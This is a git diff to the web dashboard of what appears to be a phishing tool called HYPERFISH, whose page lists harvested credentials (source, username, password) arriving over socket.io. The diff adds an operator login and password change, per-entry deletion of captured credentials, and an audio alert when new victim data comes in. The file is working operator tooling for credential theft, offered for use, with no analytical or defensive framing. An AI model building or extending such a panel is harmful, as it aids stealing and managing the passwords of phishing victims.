@@ -1,12 +1,15 @@
 <html>
     <title>HYPERFISH Web UI</title>
     <head>
+            
             <script src="/socket.io/socket.io.js"></script>
             <script src="https://code.jquery.com/jquery-1.11.1.js"></script>
+            <audio src="notification.mp3" id="notification" autostart="false"></audio>
     </head>
     <body>
  
            <div id="main-content-div">
+               
 <center>
 <xmp>
         ██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗ ███████╗██╗███████╗██╗  ██╗
@@ -16,15 +19,32 @@
         ██║  ██║   ██║   ██║     ███████╗██║  ██║██║     ██║███████║██║  ██║
         ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝
     </xmp>
+    <a class="logout hide" id="logout" onclick="logout()">Log Out</a>
 </center>
-                <table id="table" >
+                <table id="table" class="hide">
                         <tr>
                           <th>From</th>
                           <th>Username</th>
                           <th>Password</th>
+                          <th></th>
                         </tr>
                         
                       </table>
+                      <div id="loginPanel" class="loginpanel">
+                          <center><h1>Log In</h1></center>
+                          <center><h2 class="error" id="error">Error</h2></center>
+                        <input id="webUser-password" class="webuser-password" type="password" placeholder="Password"></input>
+                        <input id="webUser-password-submit" class="webuser-password-submit" type="submit" value="submit" onclick="checkLogin()"></input>
+                        <a class="change-password" onclick="changePassword()">Change Password</a>
+                      </div>
+                      <div id="changePasswordPanel" class="changePasswordPanel hide" >
+                            <center><h1>Change Password</h1></center>
+                            <center><h2 class="error" id="error">Error</h2></center>
+                            <input id="old-webUser-password" class="webuser-password" type="password" placeholder="Old Password"></input>
+                          <input id="new-webUser-password" class="new-webuser-password" type="password" placeholder="New Password"></input>
+                          <input id="webUser-change-password-submit" class="webuser-password-submit" type="submit" value="submit" onclick="checkChangePassword()"></input>
+                          <a class="change-password" onclick="cancelChangePassword()">Cancel</a>
+                        </div>
         </div>
 
     </body>
@@ -33,23 +53,170 @@
 <script>
 
 var socket = io();
-
-
+var loggedIn = "false"
+var table = `           <tr>
+                          <th>From</th>
+                          <th>Username</th>
+                          <th>Password</th>
+                          <th></th>
+                        </tr>`
 
 $( window ).load(function() {
-
-  socket.emit('queryCredentials')
 });
 
-socket.on('queriedCredentials', function(from, gmail, password){
-    document.getElementById('table').innerHTML += "<tr><td>" + from + "</td><td>" + gmail + "</td><td>" + password + "</td></tr>"
+socket.on('queriedCredentials', function(from, email, password, id){
+    document.getElementById('table').innerHTML += "<tr><td>" + from + "</td><td>" + email + "</td><td>" + password + "</td><td><div class='remove' onclick='remove(\"" + id + "\")'></div></td></tr>"
 })
 socket.on('newData', function(){
-    socket.emit('queryCredentials')
+    newData()  
 })
+function changePassword(){
+    $("#changePasswordPanel").removeClass("hide");
+    $("#loginPanel").addClass("hide");
+}
+function cancelChangePassword(){
+    $("#changePasswordPanel").addClass("hide");
+    $("#loginPanel").removeClass("hide");
+}
+function newData(){
+    if (loggedIn == "true"){
+    document.getElementById("table").innerHTML = table
+    socket.emit('queryCredentials')
+    notify()
+    }else{
+        console.log("notLoggedIn")
+    }
+}
+function remove(id){
+    console.log(id)
+    socket.emit('deleteCredential', id)
+    newData()
+}
+function login(){
+     loggedIn = "true"
+     $("#logout").removeClass("hide");
+    $("#table").removeClass("hide");
+    $("#loginPanel").addClass("hide");
+    socket.emit('queryCredentials')
+}
+function logout(){
+    document.getElementById("table").innerHTML = table
+    loggedIn = "false"
+     $("#logout").addClass("hide");
+    $("#table").addClass("hide");
+    $("#loginPanel").removeClass("hide");
+    socket.emit('logout')
+}
+function notify () {
+    var thissound = document.getElementById('notification');
+    thissound.play();
+  }
+function checkLogin(){
+    var password = document.getElementById('webUser-password').value
+    socket.emit('checkLogin',password)
+}
+function checkChangePassword(){
+    var oldPassword = document.getElementById('old-webUser-password').value
+    var newPassword = document.getElementById('new-webUser-password').value
+    socket.emit('checkChangePassword', oldPassword, newPassword)
+}
+socket.on('changePasswordError', function(){
+    console.log("error")
+    $("#error").addClass("show");
+})
+socket.on('loginTrue',function(){
+    login()
+})
+  $("#webUser-password").keyup(function(event) {
+		if (event.keyCode == 13) {
+			$("#webUser-password-submit").click();
+			
+		}
+	});
+    $("#new-webUser-password").keyup(function(event) {
+		if (event.keyCode == 13) {
+			$("#webUser-change-password-submit").click();
+			
+		}
+	});
 </script>
 <style>
-    #main-content-div{
+    *{
+        outline:none;
+        
+    }
+    .error{
+        display: none;
+        font-family: helvetica;
+        color:red;
+    }
+    .logout{
+        position: absolute;
+        color:#2980b9;
+        font-family: helvetica;
+        cursor:pointer;
+        top:70px;
+        right:70px;
+        font-size: 10pt;
+    }
+    .change-password{
+        float:right;
+        font-size:10pt;
+        color:#2980b9;
+        font-family: helvetica;
+        margin-top:5px;
+        cursor: pointer;
+    }
+    .show{
+        display: block;
+    }
+    .hide{
+        display: none;
+    }
+    .webUser-password{
+        background:#2980b9;
+        border:none;
+        border-radius: 5px;
+        margin-top:50px;
+        height:30px;
+        width:300px;
+        padding-left:20px;
+    }
+    .new-webUser-password{
+        background:#2980b9;
+        border:none;
+        border-radius: 5px;
+        margin-top:20px;
+        height:30px;
+        width:300px;
+        padding-left:20px;
+    }
+    .webUser-password-submit{
+        
+        border:none;
+        background:#2c3e50;
+        border-radius: 5px;
+        margin-top:20px;
+        height:30px;
+        width:300px;
+    }
+    .loginpanel{
+        position: absolute;
+        margin-right:-150px;
+        right:50%;
+        width:300px;
+        font-family: helvetica;
+        color:#2c3e50;
+    }
+    .changePasswordPanel{
+        position: absolute;
+        margin-right:-150px;
+        right:50%;
+        width:300px;
+        font-family: helvetica;
+        color:#2c3e50;
+    }
+        #main-content-div{
         position: absolute;
  
         top:0px;
@@ -62,6 +229,7 @@ socket.on('newData', function(){
         background:#1c2125;
     }
     table {
+
     position: absolute;
     right:50%;
     margin-top:20px;
@@ -104,5 +272,26 @@ table tr:last-child td:first-child {
 
 table tr:last-child td:last-child {
     border-bottom-right-radius: 10px;
+}
+.remove{
+    border:none;
+    background: transparent;
+    background-image: url('x.png');
+    background-size: 20px,20px;
+    width:20px;
+    height:20px;
+    float:right;
+}
+::-webkit-input-placeholder { /* WebKit browsers */
+    color:    black;
+}
+:-moz-placeholder { /* Mozilla Firefox 4 to 18 */
+    color:    black;
+}
+::-moz-placeholder { /* Mozilla Firefox 19+ */
+    color:    black;
+}
+:-ms-input-placeholder { /* Internet Explorer 10+ */
+    color:    black;
 }
 </style>
